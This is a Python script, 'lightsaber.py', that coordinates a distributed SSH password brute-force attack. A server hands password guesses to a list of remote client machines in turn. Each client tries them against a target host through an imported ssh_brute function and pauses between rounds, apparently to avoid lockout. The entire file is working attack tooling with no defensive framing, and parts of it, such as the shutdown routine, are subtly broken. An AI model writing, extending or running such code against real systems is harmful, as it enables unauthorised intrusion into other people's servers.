from passwd_cracker import ssh_brute
import passwd_cracker
import socket
from threading import Thread
import argparse
import time
parser = argparse.ArgumentParser(
    prog='lightsaber.py',
    description='Creates a ping pong brute force attack.',
    epilog='Run script with host-type: [main] for server and [remote] for client. \
            Tip: install remote clients first.')
parser.add_argument("--host-type")
parser.add_argument("--link-list")
parser.add_argument("--server-ip")
parser.add_argument("--local-ip")
parser.add_argument("--target-ip")
args = parser.parse_args()
link_list: str = ""
with open(args.link_list, 'r') as f:
    link_list = f.read()
    f.close()

target_ip: str = args.target_ip
local_addr: tuple = (args.local_ip, 1337)
addr_list: list[tuple] = [(li, 1337) for li in link_list.split('\n')]
server_addr: tuple = (args.server_ip, 1338)
index: int = 0

combinations = passwd_cracker.gen_combinations(char_len=3)
comb_index: int = 0
rest_counter: int = 0


def socket_rcv(addr: tuple):
    def decorator(fn):
        def decorator_f(*args):
            try:

                # Create a socket object
                server_socket = socket.socket(
                    socket.AF_INET, socket.SOCK_STREAM)

                # Bind the socket to the host and port
                print(addr)
                server_socket.bind(addr)

                # Listen for incoming connections (maximum of 5 clients in the queue)
                server_socket.listen(5)
                print(f"Server listening on {str(addr)}")

                while True:
                    # Accept a connection from a client
                    print("Waiting for connection..")
                    client_socket, client_address = server_socket.accept()
                    print(f"Accepted connection from {client_address}")
                    print(str(addr))

                    # Receive data from the client
                    data = client_socket.recv(1024)  # Receive up to 1024 bytes
                    message = data.decode()  # Decode the received bytes into a string
                    if message == "shutdown":
                        exit(0)
                    if not data:
                        break  # Exit the loop if no data is received

                    print("message sent to ", str(fn))
                    # You can process the message here or respond to the client as needed
                    time.sleep(2)
                    # Close the client socket
                    client_socket.close()
                    print("closed client conn!")
                    # Sending message in thread
                    t = Thread(target=fn, args=(message,))
                    t.start()

            except Exception as e:
                print(f"Error: {str(e)}")
        return decorator_f
    return decorator


def snd_ping(addr: tuple = addr_list[index], msg: str = "crack",
             dst_host: str = "127.0.0.1", username: str = "kali", pw: str = "pwd"):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print(addr)
        s.connect(addr)
        s.send(f"{msg} {dst_host} {username} {pw}".encode())
        print("Sending ping!")
        s.close()


@socket_rcv(addr=local_addr)
def rcv_ping(message: str = ""):
    global rest_counter
    message = message.split(' ')
    passwd_cracker.host = message[1]
    passwd_cracker.username = message[2]
    ssh_brute(message[3])
    rest_counter += 1
    if rest_counter == 8:
        time.sleep(8.4)
        rest_counter = 0
    else:
        time.sleep(3.7)
    if passwd_cracker.crack_file.is_file():
        print("cracked.txt")
        snd_pong(addr=server_addr, cracked=True)
    else:
        snd_pong(addr=server_addr)
        return True


def snd_pong(addr: tuple = server_addr, cracked: bool = False):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(addr)
        i = addr_list.index(local_addr)
        if i + 1 > len(addr_list) - 1:
            i = -1
        s.send(f"{i} {cracked}".encode())
        print("SENT PONG")
        s.close()


# Run from main server...
def shutdown(hosts: list[str]):
    for host in hosts:
        snd_ping(addr=host, msg="shutdown")
    snd_pong(addr=server_addr, msg="shutdown")


@socket_rcv(addr=server_addr)
def rcv_pong(message: str = ""):
    global comb_index
    data = message.split(' ')
    i = int(data[0])
    print(data[1])
    if data[1] == "True":
        print(f"Cracked on machine: {str(addr_list[i])}")
        exit(0)
    if isinstance(i, int):
        snd_ping(addr=addr_list[i + 1],
                 dst_host=target_ip, pw=combinations[comb_index])
        comb_index += 1
        print("Sent a ping back!")
        return True
    else:
        shutdown([x[0] for x in addr_list])
        raise Exception("CRACKED!")


def main():
    global args
    global comb_index
    print(local_addr)
    if args.host_type == "main":
        snd_ping(addr=addr_list[0], dst_host=target_ip,
                 pw=combinations[comb_index])
        comb_index += 1
        rcv_pong()

    elif args.host_type == "remote":
        rcv_ping()


if __name__ == '__main__':
    main()
